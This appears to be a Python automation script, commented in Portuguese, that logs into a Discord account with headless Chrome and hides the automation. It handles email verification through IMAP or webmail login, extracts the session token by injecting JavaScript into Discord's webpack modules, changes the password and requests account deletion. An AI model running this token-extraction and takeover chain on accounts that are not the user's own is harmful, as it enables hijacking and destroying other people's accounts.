import os
import random
import string
import requests
import json
import imaplib
import email
from email.header import decode_header
import time
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
import shutil

try:
    import tls_client
except ModuleNotFoundError:
    print("Installing tls_client...")
    os.system('pip install tls-client > nul')
    import tls_client

class EmailVerifier:
    def __init__(self, email_address, email_password, imap_server=None):
        self.email_address = email_address
        self.email_password = email_password
        domain = email_address.lower().split('@')[-1]
        if imap_server is None:
            if 'gmail.com' in domain:
                self.imap_server = "imap.gmail.com"
            elif 'outlook.com' in domain or 'hotmail.com' in domain:
                self.imap_server = "imap-mail.outlook.com"
            elif 'yahoo.com' in domain:
                self.imap_server = "imap.mail.yahoo.com"
            else:
                self.imap_server = "imap.gmail.com"  # default
        else:
            self.imap_server = imap_server
        self.mail = None
    
    def connect(self):
        """Conecta ao servidor de email"""
        try:
            self.mail = imaplib.IMAP4_SSL(self.imap_server)
            self.mail.login(self.email_address, self.email_password)
            return True
        except Exception as e:
            print(f"Erro ao conectar ao email: {e}")
            domain = self.email_address.lower().split('@')[-1]
            if 'gmail.com' in domain:
                print("Dica: Para Gmail, use 'App Password' se 2FA estiver ativado (Configurações > Segurança > App Passwords)")
            elif 'outlook.com' in domain or 'hotmail.com' in domain:
                print("Dica: Para Outlook, gere 'App Password' em Configurações > Segurança > Senhas de App Mais Seguras")
            elif 'yahoo.com' in domain:
                print("Dica: Para Yahoo, ative 'Acesso de Apps Menos Seguros' ou use App Password")
            return False
    
    def disconnect(self):
        """Desconecta do servidor de email"""
        if self.mail:
            try:
                self.mail.close()
                self.mail.logout()
            except:
                pass
    
    def search_discord_verification_email(self, timeout=120):
        """Procura por email de verificação do Discord"""
        if not self.mail:
            if not self.connect():
                return None
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                self.mail.select("inbox")
                
                # Procura por emails do Discord
                status, messages = self.mail.search(None, '(FROM "noreply@discord.com" SUBJECT "verif")')
                
                if status == "OK" and messages[0]:
                    # Pega o email mais recente
                    latest_email_id = messages[0].split()[-1]
                    
                    status, msg_data = self.mail.fetch(latest_email_id, "(RFC822)")
                    if status == "OK":
                        raw_email = msg_data[0][1]
                        msg = email.message_from_bytes(raw_email)
                        
                        # Extrai o corpo do email
                        verification_url = self.extract_verification_url(msg)
                        if verification_url:
                            return verification_url
                
                time.sleep(5)
                
            except Exception as e:
                print(f"Erro ao buscar email: {e}")
                time.sleep(5)
        
        return None
    
    def extract_verification_url(self, msg):
        """Extrai URL de verificação do email do Discord"""
        try:
            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))
                    
                    if content_type == "text/plain" and "attachment" not in content_disposition:
                        body = part.get_payload(decode=True).decode()
                        return self.find_verification_url(body)
                    elif content_type == "text/html":
                        body = part.get_payload(decode=True).decode()
                        return self.find_verification_url(body)
            else:
                body = msg.get_payload(decode=True).decode()
                return self.find_verification_url(body)
        except Exception as e:
            print(f"Erro ao extrair URL: {e}")
        
        return None
    
    def find_verification_url(self, text):
        """Encontra URL de verificação no texto do email"""
        patterns = [
            r'https://discord\.com/verify-email\?[^\s<>"\']+',
            r'https://discord\.com/activate\?[^\s<>"\']+',
            r'https://verify\.discord\.com/[^\s<>"\']+',
            r'https://click\.discord\.com/ls/click\?[^\s<>"\']+'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            if matches:
                return matches[0]
        
        return None

def get_discord_token(driver):
    js_code = """
    let token = null;
    window.webpackChunkdiscord_app.push([
        [Symbol()],
        {},
        req => {
            if (!req.c) return;
            for (let m of Object.values(req.c)) {
                try {
                    if (!m.exports || m.exports === window) continue;
                    if (m.exports?.getToken) {
                        token = m.exports.getToken();
                        break;
                    }
                    for (let ex in m.exports) {
                        if (m.exports?.[ex]?.getToken && m.exports[ex][Symbol.toStringTag] !== 'IntlMessagesProxy') {
                            token = m.exports[ex].getToken();
                            break;
                        }
                    }
                } catch {}
            }
        },
    ]);
    window.webpackChunkdiscord_app.pop();
    return token;
    """
    return driver.execute_script(js_code)

class Change:
    def get_random_str(self, length: int) -> str:
        return "".join(
            random.choice(string.ascii_letters + string.digits) for _ in range(length)
        )
    
    def get_discord_cookies(self):
        try:
            response = requests.get("https://discord.com")
            if response.status_code == 200:
                return "; ".join(
                    [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                ) + "; locale=en-US"
            else:
                return "__dcfduid=example; __sdcfduid=example; locale=en-US"
        except Exception as e:
            print(f"Erro ao obter cookies: {e}")
            return "locale=en-US"
    
    def Headers(self, token):
        return {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
            'authorization': token,
            'content-type': 'application/json',
            'cookie': self.get_discord_cookies(),
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'America/Sao_Paulo',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InB0LUJSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMzEuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMzEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MzAwMDAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
        }
   
    def Changer(self, token, password, email, new_pass, logs=None):
        if logs is None:
            logs = []
        session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
        headers = self.Headers(token)
        data = {
            'password': password,
            'new_password': new_pass,
        }
        try:
            response = session.patch('https://discord.com/api/v9/users/@me', headers=headers, json=data)
            if response.status_code == 200:
                new_token = response.json()['token']
                msg = f"(+): Senha alterada para {email} → {new_token[:20]}..."
                print(msg)
                logs.append({"message": msg, "level": "success"})
                return True, new_token
            elif response.status_code == 400:
                error = response.json()
                if 'code' in error.get('errors', {}).get('password', {}):
                    msg = f"2FA requerido para mudança de senha. Digite o código manualmente."
                    print(msg)
                    logs.append({"message": msg, "level": "warning"})
                    return False, None
                msg = f"(!): Erro 400 na mudança para {email}: {error}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False, None
            else:
                msg = f"(!): Falha na mudança para {email}: {response.status_code} - {response.text}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False, None
        except Exception as e:
            msg = f"Exceção na mudança: {e}"
            print(msg)
            logs.append({"message": msg, "level": "error"})
            return False, None

    def Deleter(self, token, password, logs=None):
        if logs is None:
            logs = []
        session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
        headers = self.Headers(token)
        data = {"password": password}
        try:
            response = session.post('https://discord.com/api/v9/users/@me/delete', headers=headers, json=data)
            if response.status_code == 204:
                msg = "Solicitação de exclusão enviada com sucesso. Não logue por 14 dias até a conta ser excluida"
                print(msg)
                logs.append({"message": msg, "level": "success"})
                return True
            elif response.status_code == 400:
                error = response.json()
                if 'code' in error.get('errors', {}).get('password', {}):
                    msg = f"2FA requerido para exclusão. Digite o código manualmente."
                    print(msg)
                    logs.append({"message": msg, "level": "warning"})
                    return False
                msg = f"(!): Erro 400 na exclusão: {error}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False
            else:
                msg = f"(!): Falha na exclusão: {response.status_code} - {response.text}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False
        except Exception as e:
            msg = f"Exceção na exclusão: {e}"
            print(msg)
            logs.append({"message": msg, "level": "error"})
            return False

def detect_email_verification(driver):
    """Detecta se é necessária verificação de email"""
    try:
        # Verifica elementos que indicam necessidade de verificação
        verification_indicators = [
            "//*[contains(text(), 'Verify')]",
            "//*[contains(text(), 'Verificar')]", 
            "//*[contains(text(), 'email verification')]",
            "//*[contains(text(), 'verificação de email')]",
            "//*[contains(text(), 'check your email')]",
            "//*[contains(text(), 'verifique seu email')]",
            "//button[contains(text(), 'Resend')]",
            "//button[contains(text(), 'Reenviar')]"
        ]
        
        for indicator in verification_indicators:
            elements = driver.find_elements(By.XPATH, indicator)
            if elements:
                return True
                
        # Verifica se ainda está na página de login após credenciais corretas
        current_url = driver.current_url
        if 'login' in current_url.lower():
            # Verifica se não há mensagens de erro de credenciais
            error_indicators = [
                "//*[contains(text(), 'Invalid login')]",
                "//*[contains(text(), 'Login inválido')]",
                "//*[contains(text(), 'Wrong password')]",
                "//*[contains(text(), 'Senha incorreta')]"
            ]
            
            has_errors = False
            for error_indicator in error_indicators:
                if driver.find_elements(By.XPATH, error_indicator):
                    has_errors = True
                    break
            
            if not has_errors:
                return True
                
    except Exception as e:
        print(f"Erro na detecção de verificação: {e}")
    
    return False

def detect_captcha(driver):
    """Detecta se há um CAPTCHA na página"""
    try:
        captcha_indicators = [
            (By.CLASS_NAME, "h-captcha"),
            (By.CSS_SELECTOR, "[data-hcaptcha-widget-id]"),
            (By.CSS_SELECTOR, "iframe[src*='hcaptcha.com']"),
            (By.XPATH, "//*[contains(text(), 'CAPTCHA')]"),
            (By.XPATH, "//*[contains(text(), 'Verificação de segurança')]")
        ]
        for by, value in captcha_indicators:
            if driver.find_elements(by, value):
                return True
    except Exception as e:
        print(f"Erro na detecção de CAPTCHA: {e}")
    return False

def automate_webmail_login(driver, email, email_password):
    """Automatiza login no webmail usando o driver Selenium já aberto."""
    domain = email.lower().split('@')[-1]
    try:
        if 'gmail.com' in domain:
            # Gmail login
            driver.execute_script("window.open('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin', '_blank');")
            driver.switch_to.window(driver.window_handles[-1])
            time.sleep(3)
            
            # Preenche email
            email_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "identifierId")))
            email_field.send_keys(email)
            driver.find_element(By.ID, "identifierNext").click()
            time.sleep(3)
            
            # Preenche senha
            password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "Passwd")))
            password_field.send_keys(email_password)
            driver.find_element(By.ID, "passwordNext").click()
            time.sleep(5)
            
            # Navega para inbox
            driver.get("https://mail.google.com/mail/u/0/#inbox")
            time.sleep(5)
            
        elif 'outlook.com' in domain or 'hotmail.com' in domain:
            # Outlook login
            driver.execute_script("window.open('https://login.live.com/', '_blank');")
            driver.switch_to.window(driver.window_handles[-1])
            time.sleep(3)
            
            # Preenche email
            email_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "loginfmt")))
            email_field.send_keys(email)
            driver.find_element(By.ID, "idSIButton9").click()
            time.sleep(3)
            
            # Preenche senha
            password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "passwd")))
            password_field.send_keys(email_password)
            driver.find_element(By.ID, "idSIButton9").click()
            time.sleep(5)
            
            # Navega para inbox
            driver.get("https://outlook.live.com/mail/0/inbox")
            time.sleep(5)
            
        elif 'yahoo.com' in domain:
            # Yahoo login
            driver.execute_script("window.open('https://login.yahoo.com/', '_blank');")
            driver.switch_to.window(driver.window_handles[-1])
            time.sleep(3)
            
            # Preenche email
            email_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "login-username")))
            email_field.send_keys(email)
            driver.find_element(By.ID, "login-signin").click()
            time.sleep(3)
            
            # Preenche senha
            password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "login-passwd")))
            password_field.send_keys(email_password)
            driver.find_element(By.ID, "login-signin").click()
            time.sleep(5)
            
            # Navega para inbox
            driver.get("https://mail.yahoo.com/")
            time.sleep(5)
        
        # Verifica se login foi bem-sucedido (procura por elementos de inbox)
        inbox_indicators = [
            "//*[contains(text(), 'Inbox')]",
            "//*[contains(text(), 'Caixa de entrada')]",
            "//div[contains(@class, 'inbox')]"
        ]
        for indicator in inbox_indicators:
            if driver.find_elements(By.XPATH, indicator):
                return True
        
        return False  # Falha no login
        
    except Exception as e:
        print(f"Erro no login automático do webmail: {e}")
        return False
    finally:
        # Volta para a aba do Discord
        if len(driver.window_handles) > 1:
            driver.close()
        driver.switch_to.window(driver.window_handles[0])

def process_account(email, old_password, new_password, email_password=None, logs=None):
    """Processa uma conta: obtém token, muda senha e exclui."""
    if logs is None:
        logs = []

    def log_message(msg, level="info"):
        print(msg)
        logs.append({"message": msg, "level": level})

    log_message("Iniciando o processo de login automático...")

    token = None
    verification_required = False
    current_email_password = email_password
    
    # Configurações para Streamlit Cloud (Linux/headless)
    options = Options()
    options.add_argument('--headless')  # Modo sem GUI (essencial pro cloud)
    options.add_argument('--no-sandbox')  # Necessário pro Linux cloud
    options.add_argument('--disable-dev-shm-usage')  # Evita crashes de memória
    options.add_argument('--disable-gpu')  # Desabilita GPU em headless
    options.add_argument('--window-size=1920,1080')  # Tamanho virtual da janela
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("--incognito")
    options.add_argument("--disable-notifications")

    # Usa webdriver-manager para auto-instalar driver
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)

    login_success = False
    try:
        log_message("Tentando login automático. Aguarde...")

        driver.get('https://discord.com/login')

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "email")))
        email_input = driver.find_element(By.NAME, "email")
        email_input.clear()
        email_input.send_keys(email)

        password_input = driver.find_element(By.NAME, "password")
        password_input.clear()
        password_input.send_keys(old_password)

        submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        submit_button.click()

        # Loop personalizado para aguardar login, com detecção de CAPTCHA e verificação
        captcha_resolved = False
        verification_checked = False
        start_time = time.time()
        while time.time() - start_time < 600:  # Timeout de 10 minutos
            current_url = driver.current_url.lower()

            if 'channels' in current_url or 'app' in current_url:
                login_success = True
                break

            if detect_captcha(driver) and not captcha_resolved:
                log_message("CAPTCHA detectado! Por favor, resolva manualmente no navegador aberto.", "warning")
                input("Aperte Enter após resolver o CAPTCHA...")
                captcha_resolved = True
                continue

            # Checa por 2FA
            try:
                if driver.find_elements(By.NAME, "code"):
                    log_message("2FA detectado. Aguardando código...", "warning")
                    input("Aperte Enter após inserir o código 2FA...")
            except:
                pass

            # Checa por verificação de email apenas após o CAPTCHA ou login inicial
            if not verification_checked:
                time.sleep(5)  # Aguarda um pouco para a página carregar
                verification_required = detect_email_verification(driver)
                verification_checked = True

            if verification_required:
                if current_email_password:
                    log_message("Verificação de email detectada. Iniciando processo automático...", "info")
                    
                    verifier = EmailVerifier(email, current_email_password)
                    verification_url = verifier.search_discord_verification_email(timeout=60)
                    
                    if verification_url:
                        log_message("URL de verificação encontrada! Processando...", "success")
                        driver.execute_script(f"window.open('{verification_url}', '_blank');")
                        driver.switch_to.window(driver.window_handles[-1])
                        time.sleep(5)
                        driver.close()
                        driver.switch_to.window(driver.window_handles[0])
                        time.sleep(3)
                        log_message("Verificação de email concluída!", "success")
                    else:
                        log_message("Não foi possível encontrar o email automaticamente.", "warning")
                        # Tenta login automático no webmail
                        log_message("Tentando login automático no webmail...", "info")
                        login_success_webmail = automate_webmail_login(driver, email, current_email_password)
                        if login_success_webmail:
                            log_message("Login no webmail realizado. Procure o email de verificação e clique no link manualmente.", "success")
                            input("Aperte Enter após clicar no link de verificação...")
                        else:
                            log_message("Falha no login automático do webmail. Faça manualmente.", "error")
                            input("Aperte Enter após verificar manualmente...")
                else:
                    log_message("⚠️ Verificação de email detectada! Sem senha do email fornecida. Faça manualmente.", "warning")
                    input("Aperte Enter após verificar o email manualmente...")

            time.sleep(2)

        if not login_success:
            current_url = driver.current_url
            page_source = driver.page_source.lower()

            error_type = None
            if 'login' in current_url.lower():
                if any(phrase in page_source for phrase in ['couldn\'t find an account', 'não encontramos uma conta', 'email not found', 'e-mail não encontrado']):
                    error_type = "Wrong Email"
                    log_message("⚠️ AVISO: Email não encontrado. Verifique se o email está correto.", "error")
                elif any(phrase in page_source for phrase in ['incorrect password', 'senha incorreta', 'invalid credentials', 'wrong password']):
                    error_type = "Wrong Password"
                    log_message("⚠️ AVISO: Senha do Discord incorreta. Verifique e tente novamente.", "error")
                else:
                    error_type = "Wrong Login"
                    log_message("⚠️ Erro no login. Verifique credenciais ou conexão.", "error")

            if error_type:
                driver.quit()
                return f"{error_type}", logs

            msg = "Falha no login (timeout). Processo cancelado."
            log_message(msg, "error")
            driver.quit()
            return "LOGIN_TIMEOUT", logs

        # Aguarda o login completo após verificação
        start_time = time.time()
        while time.time() - start_time < 60:
            if 'channels' in driver.current_url.lower() or 'app' in driver.current_url.lower():
                login_success = True
                break
            time.sleep(2)

        if login_success:
            token = get_discord_token(driver)
            if not token:
                log_message("Não foi possível obter o token. Tentando novamente...", "warning")
                token = None
            else:
                log_message("Token obtido com sucesso! Fechando navegador...", "success")
        else:
            token = None

    finally:
        driver.quit()
        time.sleep(2)
        profile_dir = os.path.join(os.getcwd(), "temp_profile_token")
        try:
            if os.path.exists(profile_dir):
                shutil.rmtree(profile_dir)
        except:
            pass

    if token:
        changer = Change()
        change_success, new_token = changer.Changer(token, old_password, email, new_password, logs)

        if change_success and new_token:
            log_message("Mudança de senha bem-sucedida. Prosseguindo para exclusão...", "success")
            deleter_success = changer.Deleter(new_token, new_password, logs)
            if deleter_success:
                log_message("Tudo concluído!", "success")
                return "SUCCESS", logs
            else:
                log_message("Falha na exclusão.", "error")
                return "DELETE_FAILED", logs
        else:
            log_message("Falha na mudança de senha. Tentando exclusão com senha antiga...", "warning")
            deleter_success = changer.Deleter(token, old_password, logs)
            if deleter_success:
                log_message("Exclusão concluída com senha antiga.", "success")
                return "SUCCESS", logs
            else:
                log_message("Falha na exclusão.", "error")
                return "DELETE_FAILED", logs
    else:
        log_message("Falha ao obter token. Processo cancelado.", "error")
        return "TOKEN_FAILED", logs